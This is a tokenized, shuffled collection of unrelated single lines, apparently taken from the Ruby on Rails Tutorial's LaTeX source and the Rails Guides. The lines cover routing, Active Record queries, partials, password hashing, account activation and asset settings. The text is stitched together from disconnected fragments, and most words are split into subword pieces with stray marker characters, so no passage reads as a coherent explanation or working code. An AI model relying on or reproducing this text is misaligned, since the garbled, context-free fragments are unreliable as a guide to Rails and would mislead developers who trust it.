▁The ▁result ▁show n ▁gives ▁some ▁details ▁about ▁the ▁process , ▁but ▁the ▁most ▁important ▁thing ▁is ▁the ▁first ▁number , ▁which ▁is ▁the ▁\ emph { process ▁id }, ▁or ▁p id .
▁format ▖ html ▁ { ▁render ▁layout : ▁' my _ layout ' ▁ }
▁These ▁are ▁` downcase `, ▁` g s ub `, ▁` strip `, ▁` ch o mp `, ▁` underscore `, ▁etc .
▁ Partial ▁templates ▁- ▁usually ▁just ▁called ▁" partial s " ▁- ▁are ▁another ▁ dev ice ▁for ▁break ing ▁the ▁rendering ▁process ▁into ▁more ▁manage able ▁ ch un k s ▖
▁ Save ▁the ▁hash ▁digest ▁of ▁the ▁token ▁to ▁the ▁database .
▁In ▁the ▁present ▁case , ▁that ▁point ▁is ▁before ▁the ▁object ▁is ▁saved , ▁so ▁we ' ll ▁use ▁a ▁\ k ode { before \_ save } ▁callback ▁to ▁ downcase ▁the ▁email ▁attribute ▁before ▁saving ▁the ▁user
▁Load ing ▁development ▁environment ▁in ▁ sandbox
▁In ▁Chapter ~\ ref { cha : updating _ showing _ and _ deleting _ users }, ▁we ' ll ▁ im po se ▁a ▁security ▁model ▁in ▁which ▁only ▁logged - in ▁users ▁can ▁visit ▁the ▁user ▁index ▁page , ▁only ▁the ▁correct ▁user ▁can ▁access ▁the ▁page ▁for ▁edit ing ▁their ▁information , ▁and ▁only ▁ administrative ▁users ▁can ▁delete ▁other ▁users ▁from ▁the ▁database .
▁ Each ▁of ▁these ▁helpers ▁has ▁a ▁corresponding ▁` _ url ` ▁helper ▁( such ▁as ▁` photos _ url ` ) ▁which ▁returns ▁the ▁same ▁path ▁prefix ed ▁with ▁the ▁current ▁host , ▁ port ▁and ▁path ▁prefix .
▁In ▁that ▁section , ▁we ▁added ▁a ▁\ text tt { palindrome ?}\ ▁method ▁to ▁the ▁\ text tt { String } ▁class ▁( and ▁ discover ed ▁as ▁a ▁result ▁that ▁\ text tt {" de if i ed "} ▁is ▁a ▁ palindrome ), ▁and ▁we ▁also ▁saw ▁how ▁Rails ▁add s ▁a ▁\ text tt { blank ?}\ ▁method ▁to ▁class ▁\ text tt { Object } ▁( so ▁that ▁\ text tt {" "▖ blank ?} , ▁\ text tt {" ~ "▖ blank ?} , ▁and ▁\ text tt { nil ▖ blank ?}\ ▁are ▁all ▁\ text tt { true }) .
▁ Image s ▁can ▁also ▁be ▁ org an ize d ▁into ▁subdirectories ▁if ▁required , ▁and ▁then ▁can ▁be ╼ access ed ▁by ▁specify ing ▁the ▁directory ' s ▁name ▁in ▁the ▁tag :
▁The ▁partial ▁for ▁the ▁user ▁ info ▁ sidebar .
▁=> ▁10 2 4
▁The ▁new ▁About ▁page ▁(\ href { http :// localhost :3000/ static _ pages / about }{/ static \_ pages / about }) ▖ ~\ href { http :// railstutorial ▖ org / images / figures / about _ us _ 2 nd _ edition - full ▖ png }{( full ▁size )}
▁# ▁=> ▁" O h ▁ dear !
▁Here ▁we ▁have ▁used ▁\ k ode { Micropost ▖ where } ▁instead ▁of ▁\ k ode { Micropost ▖ find } ▁because ▁it ▁returns ▁an ▁empty ▁object ▁if ▁the ▁record ▁is ▁not ▁found ▁instead ▁of ▁ ra is ing ▁an ▁exception , ▁which ▁is ▁a ▁little ▁easier ▁to ▁test ▖ ▁(
▁Return ▁an ▁array ▁of ▁the ▁user ' s ▁microposts .
▁T w o ▁popular ╼ authentication ▁add - on s ▁for ▁Rails ▁are ▁the ╼[ Devise ]( https :// github ▖ com / plat a format ec / devise ) ▁rails ▁engine ▁and ╼ the ▁[ A u th log ic ]( https :// github ▖ com / bin ary log ic / authlogic ) ▁gem ,╼ a long ▁with ▁a ▁number ▁of ▁other s .
▁The ▁comment ▁included ▁in ▁Listing ~\ ref { code : first _ create _ action } ▁and ▁re p r o d u c ed ▁above ▁indicates ▁that ▁this ▁is ▁not ▁the ▁final ▁implementation .
▁Create s ▁a ▁submit ▁button ▁with ▁the ▁text ▁provided ▁as ▁the ▁ caption .
▁User ▖ where ( state : ▁' inactive ')
▁update ▁micropost ▁with ▁id ▁\ k ode {1}
▁H ence , ▁there ' s ▁no ▁way ▁these ▁objects ▁can ▁be ▁duplicate d ▁through ▁` dup ` ▁or ▁` clone `:
▁You ▁may ▁wish ▁to ▁ org an ize ▁ groups ▁of ▁controllers ▁under ▁a ▁ namespace ▖
▁@ order ▖ customer ▁= ▁@ customer
▁P o s s ible ▁output :
▁c 2▖ save ▁# ▁R a is es ▁an ▁ActiveRecord :: StaleObjectError
▁Inde ed , ▁this ▁ de ci s ion ▁will ▁pro ve ▁important ▁in ▁Section ~\ ref { sec : account _ activation _ mailer } .
▁#### ▁Load ing ▁All ▁Active ▁Support
▁Check ▁for ▁the ▁correct ▁links ▁to ▁the ▁Home , ▁Help , ▁About , ▁and ▁Contact ▁pages
▁It ' s ▁really ▁`` Ctrl - c '' --- the re ' s ▁no ▁need ▁to ▁hold ▁down ▁the ▁S h if t ▁key ▁to ▁get ▁a ▁cap it al ▁`` C '' --- but ▁for ▁some ▁reason ▁it ' s ▁always ▁written ▁as ▁`` Ctrl - C '' .
▁Now ▁that ▁you ' ve ▁put ▁your ▁project ▁under ▁version ▁control ▁with ▁Git , ▁it ' s ▁time ▁to ▁push ▁your ▁code ▁up ▁to ▁\ href { http :// github ▖ com } { GitHub }, ▁a ▁so cial ▁ coding ▁site ▁optimized ▁for ▁host ing ▁and ▁ sh ar ing ▁Git ▁repositories .
▁### ▁Setting ▁U p ▁a ▁Development ▁En v ir on ment
▁#### # ▁The ▁`: content _ type ` ▁Option
▁The ▁User ▁data ▁model ▁produce d ▁by ▁Listing ~\ ref { code : users _ migration } .
▁duplicate ▁= ▁array ▖ deep _ dup
▁where ▁\ k ode { string } ▁is ▁the ▁string ▁to ▁be ▁ hashed ▁and ▁\ k ode { cost } ▁is ▁the ▁\ emph { cost ▁parameter } ▁that ▁determine s ▁the ▁ com put ation al ▁ cost ▁to ▁ calculate ▁the ▁hash .
▁d ▁= ▁Date ▖ new (201 0, ▁5 , ▁ 8 ) ▁# ▁=> ▁S at , ▁ 08 ▁May ▁2010
▁ From ▁this ▁point ▁un til ▁the ▁end ▁of ▁the ▁tutorial , ▁I ▁recommend ▁so l v ing ▁the ▁ exercises ▁on ▁a ▁separate ▁topic ▁branch :
▁### ▁ Request - Base d ▁ Constraint s
▁ po ol : ▁5
▁Similar ly , ▁if ▁minutes ▁are ▁ zero ed , ▁then ▁second s ▁are ▁too ▁( unless ▁it ▁has ▁given ▁a ▁value ) :
▁Note : ▁ Only ▁the ▁` option ` ▁tags ▁are ▁returned , ▁you ▁have ▁to ▁wrap ▁this ▁call ▁in ▁a ▁regular ▁HTML ▁` select ` ▁tag .
▁### ▁Configur ing ▁ Asset s
▁ Apache ▁and ▁ NGINX ▁support ▁this ▁option , ▁which ▁can ▁be ▁enabled ▁in ╼` config / environments / production ▖ rb `:
▁| ▁| ▁4 1 3 ▁| ▁: request _ entity _ to o _ large ▁|
▁As ▁noted ▁in ▁Chapter ~\ ref { cha : a _ toy _ app }, ▁the ▁main ▁reason ▁for ▁this ▁is ▁that ▁the ▁default ▁Rails ▁page ▁typical ly ▁break s ▁at ▁Heroku , ▁which ▁make s ▁it ▁hard ▁to ▁tell ▁if ▁the ▁deployment ▁was ▁successful ▁or ▁not .
▁The ▁important ▁difference s ▁( from ▁the ▁per spec tive ▁of ▁this ▁tutorial ) ▁are ▁that ▁GitHub ▁offer s ▁un limited ▁free ▁repositories ▁( with ▁collaborat ion ) ▁for ▁open - source ▁repositories ▁while ▁charg ing ▁for ▁ private ▁ repo s , ▁whereas ▁Bitbucket ▁allows ▁un limited ▁free ▁ private ▁ repo s ▁while ▁charg ing ▁for ▁more ▁than ▁a ▁certain ▁number ▁of ▁collaborat or s .
▁Name d ▁route
▁To ▁get ▁started ▁with ▁the ▁users ▁index , ▁we ' ll ▁first ▁implement ▁a ▁security ▁model .
▁For ▁example , ▁given ▁a ▁model ▁` User ` ▁with ▁attributes ▁of ▁` name ` ▁and ▁` occupation ` ,╼ the ▁` create ` ▁method ▁call ▁will ▁create ▁and ▁save ▁a ▁new ▁record ▁into ▁the ▁database :
▁require ▁A P P _ PATH
▁You ▁can ▁use ▁the ▁`: constraints ` ▁option ▁to ▁enforce ▁a ▁format ▁for ▁a ▁dynamic ▁segment :
▁In ▁order ▁to ▁get ▁our ▁be ar ing s , ▁it ' s ▁helpful ▁to ▁recall ▁the ▁Rails ▁directory ▁structure ▁from ▁Section ~\ ref { sec : the _ hello _ application } ▁( Figure ~\ ref { fig : directory _ structure _ rails }) .
▁The ▁above ▁discussion ▁suggest s ▁ putting ▁the ▁digest - - token ▁compar is on ▁into ▁an ▁\ k ode { authenticated ?}
▁m attr _ accessor ▁: log _ ac t i v ity
▁These ▁\ k ode { name } ▁values ▁allow ▁Rails ▁to ▁construct ▁an ▁initialization ▁hash ▁( via ▁the ▁\ k ode { params } ▁variable ) ▁for ▁creating ▁users ▁using ▁the ▁values ▁entered ▁by ▁the ▁user , ▁as ▁we ' ll ▁see ▁in ▁Section ~\ ref { sec : signup _ failure } .
▁Here ▁we ▁see ▁that ▁the ▁name ▁and ▁email ▁attributes ▁have ▁been ▁set ▁as ▁expected .
▁=> ▁" \ # { foo } ▁bar "
▁The ▁` first !` ▁method ▁be have s ▁exactly ▁like ▁` first `, ▁except ▁that ▁it ▁will ▁raise ▁` ActiveRecord :: RecordNotFound ` ▁if ▁no ▁matching ▁record ▁is ▁found .
▁Of ▁course , ▁eventual ly ▁the ▁real ▁user ▁show ▁page ▁will ▁look ▁very ▁different ▁( and ▁won ' t ▁display ▁the ▁email ▁address ▁public ly ) .
▁\ href { http :// s ivers ▖ org /}{ D er e k ▁S ivers } ▁(\ href { http :// s ivers ▖ org /}{ s ivers ▖ org })
▁The ▁method ▁` class _ attribute ` ▁declare s ▁one ▁or ▁more ▁inherit able ▁class ▁attributes ▁that ▁can ▁be ▁overrid d en ▁at ▁any ▁level ▁down ▁the ▁hierarchy .
▁The ▁default ▁value ▁is ▁` false ` .
▁An y ▁modification s ▁you ▁make ▁will ▁be ▁roll ed ▁back ▁on ▁ ex it
▁* ▁How ▁to ▁generate ▁an ▁engine .
▁For ▁a ▁third ▁time , ▁we ▁we nt ▁through ▁the ▁full ▁ procedure ▁of ▁creating ▁a ▁new ▁Rails ▁application ▁from ▁scratch , ▁ installing ▁the ▁necessary ▁gems , ▁push ing ▁it ▁up ▁to ▁a ▁remote ▁repository , ▁and ▁ deploying ▁it ▁to ▁production .
▁* ▁` i 18 n ▖ callback s ` ▁In ▁the ▁development ▁environment , ▁set s ▁up ▁a ▁` to _ prepare ` ▁callback ▁which ▁will ▁call ▁` I 18 n ▖ reload !` ▁if ▁any ▁of ▁the ▁ locales ▁have ▁changed ▁since ▁the ▁last ▁request ▖
▁The ▁\ k ode { has \_ many } ▁relationship ▁between ▁a ▁user ▁and ▁its ▁microposts .
▁ Content s ▁of ▁the ▁sample ▁app ' s ▁\ k ode { config } ▁directory .
▁ Visit ▁< http :// localhost :3000/ articles / new > ▁and ▁give ▁it ▁a ▁try !
▁: name
▁You ▁can ▁specify ▁a ▁name ▁for ▁any ▁route ▁using ▁the ▁`: as ` ▁option :
▁( We ' ll ▁have ▁more ▁to ▁say ▁about ▁this ▁in ▁a ▁moment ▖)
▁U pgrading ▁from ▁Rails ▁3▖1 ▁to ▁Rails ▁3▖2
▁on ▁ deploying ▁( end )╼╼ ▁\ section { Co nclusion } ▁% ▁( fold )╼ ▁\ label { sec : beginning _ co nclusion }╼╼
▁Ruby ▁on ▁Rails ▁Tutorial
▁( where ▁\ k ode { v im } ▁m ight ▁be ▁\ k ode { gvim } ▁or ▁\ k ode { mv im } ▁depending ▁on ▁which ▁f la v or ▁of ▁ V im ▁you ▁use ) .
▁ ╼ ▁Load ing ▁development ▁environment
▁In ▁all ▁of ▁these ▁methods , ▁` collection ` ▁is ▁replace d ▁with ▁the ▁symbol ▁passed ▁as ▁the ▁first ▁argument ▁to ▁` has _ many `, ▁and ▁` collection _ singular ` ▁is ▁replace d ▁with ▁the ▁ singularize d ▁version ▁of ▁that ▁symbol ▖
▁lines ▁and ▁wrap ▁them ▁at ▁around ▁ 80 ▁characters ▖
▁( This ▁method ▁is ▁separate ▁and ▁ distinct ▁from ▁the ▁Sessions ▁controller ▁generated ▁in ▁Section ~\ ref { sec : sessions _ controller } ▖)
▁The ▁program ▁should ▁report ▁its ▁version .
▁The ▁above ▁code ▁uses ▁the ▁\ k ode { authenticated ?}\ ▁method ▁to ▁test ▁if ▁the ▁account ▁activation ▁digest ▁matches ▁the ▁given ▁token , ▁but ▁at ▁present ▁this ▁won ' t ▁work ▁because ▁that ▁method ▁is ▁special ize d ▁to ▁the ▁remember ▁token ▁( Listing ~\ ref { code : authenticated _ p }) :
▁== ▁Create Users : ▁migrat ed ▁(0▖00 18 s ) ▁============= ============== ================
▁The ▁two ▁paths ▁show n ▁would ▁ still ▁route ▁to ▁the ▁` new ` ▁and ▁` edit ` ▁actions .
▁* ▁` ar ound _ perform `
▁A lthough ▁exact ▁version ▁number s ▁may ▁differ , ▁the ▁result ▁should ▁look ▁something ▁like ▁Figure ~\ ref { fig : riding _ rails _ environment } .
▁Use d ▁to ▁control ▁which ▁site s ▁are ▁allow ed ▁to ▁by pass ▁same ▁ origin ▁p ol ic ies ▁and ▁send ▁ cross - origin ▁requests .
▁The ▁a d ▁URLs ▁require ▁a ▁ magazine :
▁identical ▁config / b oo t ▖ rb
▁# ▁Use ▁of ▁ ETag ▁is ▁di s c our age d ▁when ▁Last - Mo d if i ed ▁is ▁present
▁It ▁would ▁be ▁much ▁f ri end li er ▁to ▁redirect ▁them ▁to ▁their ▁intend ed ▁d est in ation ▁instead .
▁\ chapter { Rails - flavored ▁Ruby } ▁% ▁( fold )╼
▁ ╼ ▁This ▁is ▁the ▁sample ▁application ▁for ▁the ▁tutorial .
▁The ▁[ Y U I ▁CSS ╼ compressor ]( http :// yui ▖ github ▖ io / yui compressor / css ▖ html ) ▁provides ╼ mini f ic ation .
▁Of ▁course , ▁calling ▁` errors ▖ clear ` ▁upon ▁an ▁invalid ▁object ▁won ' t ▁actually ▁make ▁it ▁valid : ▁the ▁` errors ` ▁collection ▁will ▁now ▁be ▁empty , ▁but ▁the ▁next ▁time ▁you ▁call ▁` valid ?` ▁or ▁any ▁method ▁that ▁ tries ▁to ▁save ▁this ▁object ▁to ▁the ▁database , ▁the ▁validations ▁will ▁run ▁again ▖
▁ Adding ▁a ▁working ▁\ k ode { destroy } ▁action .
▁Testing ▁that ▁the ▁\ k ode { index } ▁action ▁is ▁ protected .
▁ Initial ly , ▁the ▁database ▁connection ▁ po ol ▁is ▁empty ▁and ▁it ▁will ▁create ▁ additional ▁connection s ▁as ▁the ▁d em and ▁for ▁them ▁increase s , ▁un til ▁it ▁reach es ▁the ▁connection ▁ po ol ▁ limit .
▁ Green
▁In ▁S ublime ▁Text , ▁you ▁can ▁use ▁\ text tt { View ▁> ▁R ul er ▁> ▁ 78 } ▁or ▁\ text tt { View ▁> ▁R ul er ▁> ▁ 80 } .
▁ / ▖ bundle
▁#### ▁P la ce h ol d er ▁Conditions
▁There ' s ▁also ▁the ▁d est ru c tive ▁version ▁` String # remove !` .
▁TIP : ▁As ▁we ' ll ▁see ▁later , ▁`@ article ▖ save ` ▁returns ▁a ▁boolean ▁indicat ing ▁whether ╼ the ▁article ▁was ▁saved ▁or ▁not .
▁This ▁will ▁involve ▁associat ing ▁an ▁activation ▁token ▁and ▁digest ▁with ▁a ▁user , ▁sending ▁the ▁user ▁an ▁email ▁with ▁a ▁link ▁including ▁the ▁token , ▁and ▁ activating ▁the ▁user ▁upon ▁click ing ▁the ▁link .
▁ Compar ing ▁the ▁console ▁sessions ▁for ▁the ▁ various ▁operator s , ▁we ▁see ▁that ▁\ text tt {@ user ▁= ▁@ user ▁|| ▁value } ▁follows ▁the ▁\ text tt { x ▁= ▁x ▁O ▁ y } ▁pattern ▁with ▁\ text tt {||} ▁in ▁the ▁place ▁of ▁\ text tt { O }, ▁which ▁suggest s ▁the ▁following ▁equivalent ▁construction :
▁ o ") ▁# ▁=> ▁true
▁Let ' s ▁fire ▁up ▁the ▁console , ▁\ k ode { require } ▁the ▁example ▁user ▁code , ▁and ▁take ▁our ▁User ▁class ▁out ▁for ▁a ▁ s p in :
▁ Adding ▁some ▁t y po gr a ph ic ▁styling ▖ ~\ href { http :// railstutorial ▖ org / images / figures / sample _ app _ typography _4_0 - full ▖ png }{( full ▁size )}
▁You ▁m ight ▁have ▁notice d ▁that ▁the ▁standard ▁Rails ▁application ▁structure ▁( Figure ~\ ref { fig : directory _ structure _ rails }) ▁has ▁an ▁application ▁directory ▁called ▁\ k ode { app / } ▁with ▁three ▁subdirectories : ▁\ k ode { models }, ▁\ k ode { views }, ▁and ▁\ k ode { controllers } .
▁Re f le c ted ▁injection ▁attacks ▁are ▁those ▁where ▁the ▁pa y load ▁is ▁not ▁store d ▁to ▁present ▁it ▁to ▁the ▁victim ▁later ▁on , ▁but ▁included ▁in ▁the ▁URL ▖ ▁E s pecially ▁search ▁forms ▁fail ▁to ▁escape ▁the ▁search ▁string ▖
▁include ▁ ActiveModel :: Validations
▁If ▁you ▁don ' t ▁know ▁any one ▁else ▁using ▁Rails , ▁try ▁h o p p ing ▁into ▁the ▁I R C ╼ r oo m ▁or ▁post ing ▁about ▁your ▁idea ▁to ▁the ▁rails - core ▁mail ing ▁list ▖
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : relationship _ belongs _ to }
▁def ▁read _ cookie
▁If ▁`@ article ▖ save ` ▁fails ▁in ▁this ▁situation , ▁we ▁need ▁to ▁show ▁the ▁form ▁back ▁to ▁the ╼ user ▖
▁| ▁GET ▁| ▁ / geocoder ▁| ▁ geocoder s # show ▁| ▁display ▁the ▁one ▁and ▁only ▁ geocoder ▁resource ▁|
▁This ▁is ▁why ▖)
▁scope ▁: inactive , ▁-> ▁ { ▁re where ▁state : ▁' inactive ' ▁ }
▁return ▁unless ▁cache _ configure d ?
▁Here ▁the ▁nested ▁\ k ode { h 1 } ▁rule ▁automatically ▁inherit s ▁the ▁\ k ode { ▖ center } ▁context .
▁[ master ▁( root - commit ) ▁d f 0 a 6 2 f ] ▁Initialize ▁repository
▁We ' ll ▁learn ▁its ▁purpose ▁short ly , ▁but ▁for ▁now ▁you ▁should ▁re name ▁it ▁before ▁proceeding :
▁Note ▁the ▁use ▁of ▁the ▁\ k ode { full \_ title } ▁helper ▁from ▁Listing ~\ ref { code : title _ helper } ▁to ▁test ▁the ▁page ' s ▁title , ▁which ▁we ▁gain ▁access ▁to ▁by ▁including ▁the ▁Application ▁ Helper ▁module ▁into ▁the ▁test
▁The ▁engine ▁will ▁then ╼ take ▁this ▁name ▁and ▁either ▁create ▁a ▁new ▁` User ` ▁object ▁from ▁it , ▁or ▁find ▁one ▁that ╼ already ▁has ▁that ▁name ▖
▁in ▁Listing ~\ ref { code : a _ test _ for _ invalid _ submission } .
▁( S ince ▁ screencasts ▁allow ▁for ▁a ▁more ▁ increment al ▁development ▁approach , ▁interested ▁readers ▁should ▁consider ▁the ▁\ href { http :// railstutorial ▖ org / screencasts } { Ruby ▁on ▁Rails ▁Tutorial ▁ screencasts } ▁for ▁a ▁full er ▁understanding ▁of ▁this ▁material ▖)
▁The ▁About ▁page ▁at ▁\ href { http :// localhost :3000/ about }{/ about } .
▁resources ▁: photos , ▁path _ name s : ▁ { ▁new : ▁' make ', ▁edit : ▁' change ' ▁ }
▁What ▁if ▁a ▁collection ▁is ▁empty ?
▁def ▁set _ expert _ locale
▁If ▁you ▁ever ▁need ▁to ▁run ▁a ▁console ▁in ▁a ▁different ▁environment ▁( to ▁debug ▁a ▁test , ▁for ▁example ), ▁you ▁can ▁pass ▁the ▁environment ▁as ▁a ▁parameter ▁to ▁the ▁\ text tt { console } ▁ script :
▁De let ing ▁a ▁customer ▁and ▁all ▁of ▁its ▁orders ▁is ▁* much * ▁easier :
▁This ▁ subselect ▁arrange s ▁for ▁all ▁the ▁set ▁logic ▁to ▁be ▁push ed ▁into ▁the ▁database , ▁which ▁is ▁more ▁ efficient
▁<% ▁@ article ▖ comments ▖ each ▁do ▁| comment | ▁%>
▁ 111▖2345 ▖ to _ s (: rounded , ▁significant : ▁true ) ▁# ▁=> ▁1 11
▁ ╼ ▁else
▁The ▁configuration ▁file ▁` config / application ▖ rb ` ▁and ▁environment - specific ▁configuration ▁files ▁( such ▁as ▁` config / environments / production ▖ rb ` ) ▁allow ▁you ▁to ▁specify ▁the ▁ various ▁settings ▁that ▁you ▁want ▁to ▁pass ▁down ▁to ▁all ▁of ▁the ▁ components .
▁< div ▁class =" field _ with _ errors ">
▁$ ▁ cd ▁ ▖ .
▁Client ▖ order (" orders _ count ▁ASC ")▖ order (" created _ at ▁DESC ")
▁validates ▁: name , ▁uniqueness : ▁ { ▁scope : ▁: year ,
▁The ▁view ▁for ▁the ▁Contact ▁page ▖
▁* ▁What ▁helpers ▁are ▁provided ▁by ▁Action ▁View ▁and ▁how ▁to ▁make ▁your ▁own .
▁With ▁the ▁route ▁already ╼ defined , ▁requests ▁can ▁now ▁be ▁made ▁to ▁` / articles / new ` ▁in ▁the ▁application ▖╼
▁* ▁` collection ▖ where (▖▖▖)
▁Note ▁in ▁Figure ~\ ref { fig : login _ success _ mockup } ▁that ▁the ▁ logout ▁and ▁profile ▁links ▁appear ▁in ▁a ▁ drop d own ▁`` Account '' ▁ menu ; ▁we ' ll ▁see ▁in ▁Listing ~\ ref { code : layout _ login _ logout _ links } ▁how ▁to ▁make ▁such ▁a ▁ menu ▁with ▁Bootstrap .
▁Provide s ▁a ▁number ▁of ▁methods ▁for ▁creating ▁form ▁tags ▁that ▁don ' t ▁rely ▁on ▁an ▁Active ▁Record ▁object ▁as signed ▁to ▁the ▁template ▁like ▁ Form Helper ▁does ▖
▁* ▁P ar s es ▁out ▁parameters ▁from ▁the ▁request ▁into ▁` params ` .
▁t ▁= ▁Time ▖ local (201 0, ▁3 , ▁28 , ▁1, ▁ 59 , ▁ 59 )
▁### ▁E x p li c it ▁block ▁use ▁for ▁` ActiveSupport :: Callbacks `
▁from ▁Listing ~\ ref { code : footer _ css } ▁to
▁Using ▁` lock ` ▁when ▁build ing ▁a ▁relation ▁obtain s ▁an ▁excl us ive ▁ lock ▁on ▁the ▁select ed ▁rows ▖
▁ Not ably , ▁the ▁Rails ▁routing ▁system ▁calls ▁` to _ param ` ▁on ▁models ▁to ▁get ▁a ▁value ▁for ▁the ▁`: id ` ▁place h ol d er ▖
▁Note ▁the ▁named ▁routes ▁for ▁the ▁followed ▁user ▁and ▁followers ▁pages , ▁which ▁we ' ll ▁put ▁to ▁use ▁short ly .
▁As ▁expected , ▁Rails ▁ figures ▁out ▁the ▁boolean ▁nature ▁of ▁the ▁\ k ode { admin } ▁attribute ▁and ▁automatically ▁add s ▁the ▁question - m ar k ▁method ▁\ k ode { admin ?} :
▁to ▁check ▁if ▁the ▁word ▁is ▁a ▁ palindrome
▁As ▁such , ▁be ▁careful ▁using ╼` image _ tag ` ▁and ▁the ▁other ▁helpers ▁with ▁user - s up p li ed ▁data .
▁In ▁this ▁section , ▁we ' ll ▁also ▁see ▁the ▁first ▁hint ▁of ▁a ▁\ emph { status ▁feed } --- a ▁not ion ▁br ough t ▁to ▁full ▁f ru it ion ▁in ▁Chapter ~\ ref { cha : following _ users } .
▁ Migration ▁for ▁the ▁User ▁model ▁( to ▁create ▁a ▁\ k ode { users } ▁table ) .
▁# ▁=> ▁ ActiveSupport :: Hash With I ndifferentAccess
▁It ▁works ▁like ▁` Array # map ` ▁with ▁sending ▁` deep _ dup ` ▁method ▁to ▁each ▁object ▁inside .
▁For ▁more ▁details , ▁see ▁the ▁\ href { http :// guides ▖ rubyonrails ▖ org / asset _ pipeline ▖ html } { Rails ▁G u ide ▁on ▁the ▁ Asset ▁Pipeline } .
▁By ▁default , ▁this ▁is ▁` true `: ▁ associated ▁objects ▁will ▁be ▁validate d ▁when ▁this ▁object ▁is ▁saved .
▁\ end { code }╼\ end { code listing }╼╼ ▁% ▁subsection ▁adding _ page _ title s ▁( end )╼╼ ▁\ subsection { L a y out s ▁and ▁ embedded ▁Ruby ▁( Refactor )} ▁% ▁( fold )╼ ▁\ label { sec : layouts _ and _ embedded _ ruby }╼╼
▁Here ▁Rails ▁automatically ▁insert s ▁the ▁value ▁of ▁\ k ode { about \_ path } ▁in ▁place ▁of ▁the ▁question ▁mark ▁( es c a p ing ▁any ▁special ▁characters ▁if ▁necessary ), ▁there by ▁check ing ▁for ▁an ▁HTML ▁tag ▁of ▁the ▁form
▁The ▁ability ▁to ▁save ▁a ▁secure ly ▁ hashed ▁\ k ode { password \_ digest } ▁attribute ▁to ▁the ▁database
▁d ▖ beginning _ of _ quarter ▁# ▁=> ▁Thu , ▁01 ▁Apr ▁2010
▁< li >`: user _ name ` ▁- ▁If ▁your ▁mail ▁server ▁requires ▁authentication , ▁set ▁the ▁user name ▁in ▁this ▁setting ▖ </ li >
▁* ▁` app / views / layouts / new s ▖ html ▖ erb `
▁### ▁Attributes
▁The ▁implementation ▁in ▁Listing ~\ ref { code : password _ reset _ update _ action } ▁ delegate s ▁the ▁boolean ▁test ▁for ▁password ▁reset ▁ expiration ▁to ▁the ▁User ▁model ▁via ▁the ▁code
▁TIP : ▁Active ▁Record ▁is ▁ s m ar t ▁enough ▁to ▁automatically ▁map ▁column ▁names ▁to ▁model ╼ attributes , ▁which ▁means ▁you ▁don ' t ▁have ▁to ▁declare ▁attributes ▁inside ▁Rails ╼ models , ▁as ▁that ▁will ▁be ▁done ▁automatically ▁by ▁Active ▁Record .
▁In ▁analogy ▁with ▁Listing ~\ ref { code : a _ test _ for _ invalid _ submission }, ▁which ▁used
▁In ▁our ▁case , ▁the ▁analogous ▁code ▁would ▁look ▁like ▁this :
▁select _ datetime ( Time ▖ now ▁+ ▁4 ▖ day s )
▁Because ╼ the ▁form ' s ▁remote ▁option ▁is ▁set ▁to ▁true , ▁the ▁request ▁will ▁be ▁post ed ▁to ▁the ╼` UsersController ` ▁as ▁an ▁Ajax ▁request , ▁look ing ▁for ▁JavaScript ▖
▁< h 1> New ▁article </ h 1>
▁The ▁simple r ▁way ▁is ▁to ▁use ▁` has _ and _ belongs _ to _ many `, ▁which ▁allows ▁you ▁to ▁make ▁the ▁association ▁directly :
▁In ▁addition ▁to ▁cover ing ▁all ▁the ▁material ▁in ▁the ▁book , ▁the ▁ screencasts ▁are ▁ filled ▁with ▁t ips , ▁trick s , ▁and ▁the ▁kind ▁of ▁see - how - it ' s - d one ▁ demo s ▁that ▁are ▁hard ▁to ▁capture ▁in ▁ print .
▁=> ▁[ 4 , ▁5 , ▁6 , ▁7 , ▁ 8, ▁ 9 , ▁10 , ▁ 11 , ▁ 12 , ▁1 3 , ▁ 14 , ▁ 15 , ▁ 16 , ▁17 , ▁ 18 , ▁ 19 , ▁20 , ▁2 1, ▁ 22 , ▁ 23 ,
▁But ▁first , ▁a ▁quick ▁introduction ▁to ▁the ▁situation s ▁where ▁each ▁association ▁type ▁is ▁appropriate .
▁It ▁means ▁you ▁can ▁reach ▁the ▁module ▁object ▁via ▁the ▁constant .
▁This ▁will ▁call ▁` javascript _ path ` ▁internally ▁and ▁merge ▁with ▁your ▁current ▁host ▁or ▁your ▁asset ▁host .
▁This ▁leave s ▁the ▁test ▁for ▁the ▁Home ▁page ▁as ▁the ▁last ▁one ▁to ▁fail .
▁In ▁order ▁to ▁make ▁the ▁necessary ▁User ▁model ▁object , ▁we ▁could ▁use ▁Active ▁Record ▁to ▁create ▁a ▁user ▁with ▁\ k ode { User ▖ create }, ▁but ▁experience ▁shows ▁that ▁user ▁\ emph { factor ies } ▁are ▁a ▁more ▁convenient ▁way ▁to ▁define ▁user ▁objects ▁and ▁insert ▁them ▁in ▁the ▁database .
▁With ▁all ▁the ▁prepar ation ▁ finished , ▁we ' re ▁finally ▁ready ▁to ▁get ▁started ▁developing ▁the ▁sample ▁application .
▁S ince ▁web ▁browsers ▁can ' t ▁native ly ▁send ▁\ text tt { PATCH } ▁requests ▁( as ▁required ▁by ▁the ▁REST ▁convention s ▁from ▁Table ~\ ref { table : RESTful _ users }), ▁Rails ▁fake s ▁it ▁with ▁a ▁\ text tt { POST } ▁request ▁and ▁a ▁hidden ▁\ k ode { input } ▁field
▁Note ▁that ▁" % 0 d % 0 a " ▁is ▁URL - en code d ▁for ▁" \ r \ n " ▁which ▁is ▁a ▁c ar ri age - return ▁and ▁line - feed ▁( CRLF ) ▁in ▁Ruby ▖
▁If ▁you ▁run ▁the ▁RSpec ▁example ▁using
▁GR O U P ▁BY ▁date ( created _ at )
▁* ▁How ▁to ▁ enqueue ▁job s .
▁Check ▁[ Class ▁Attributes ](# class - attributes ) .
▁Fin ally , ▁we ' ll ▁add ▁a ▁profile ▁link ▁as ▁follows :
▁Your ▁issue ▁report ▁should ▁contain ▁a ▁title ▁and ▁a ▁clear ▁ description ▁of ▁the ▁issue ▁at ▁the ▁bar e ▁ minimum ▖
▁To ▁solve ▁the ▁problem ▁of ▁a ▁missing ▁page ▁title , ▁we ' ll ▁define ▁a ▁custom ▁helper ▁called ▁\ k ode { full \_ title } .
▁The ▁user ▁profile ▁(\ href { http :// localhost :3000/ users /1}{/ users /1 }) ▁with ▁un style d ▁microposts ▖ ~\ href { http :// railstutorial ▖ org / images / figures / user _ profile _ microposts _ no _ st y l ing _ bootstrap - full ▖ png }{( full ▁size )}
▁### ▁ sass - rails
